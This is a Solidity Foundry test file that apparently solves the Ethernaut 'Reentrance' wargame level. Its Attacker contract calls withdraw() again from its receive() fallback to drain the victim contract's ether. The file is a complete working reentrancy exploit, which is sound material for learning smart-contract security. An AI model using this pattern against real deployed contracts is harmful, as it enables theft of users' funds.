// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrance/Reentrance.sol";
import "../src/Reentrance/ReentranceFactory.sol";
import "../src/Ethernaut.sol";

contract Attacker {
    address victimAddr;

    constructor(address _victimAddr) {
        victimAddr = _victimAddr;
    }

    function attack() external payable {
        Reentrance(payable(victimAddr)).donate{value: 0.1 ether}(address(this));
        Reentrance(payable(victimAddr)).withdraw(0.1 ether);
    }

    receive() external payable {
        uint elseAmount = victimAddr.balance;
        console.log("The else amount:", elseAmount);
        if (elseAmount >= 0.1 ether) {
            Reentrance(payable(victimAddr)).withdraw(0.1 ether);
        } else if (elseAmount > 0) {
            Reentrance(payable(victimAddr)).withdraw(elseAmount);
        }
    }
}

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 10 ether);
        vm.label(player, "player");
    }

    function test_reentrance_attack() public {
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            reentranceFactory
        );
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));

        console.log("Target balance:", address(ethernautReentrance).balance);

        Attacker attacker = new Attacker(address(ethernautReentrance));
        attacker.attack{value: 0.1 ether}();

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        console.log(
            "Target balance after hacked:",
            address(ethernautReentrance).balance
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
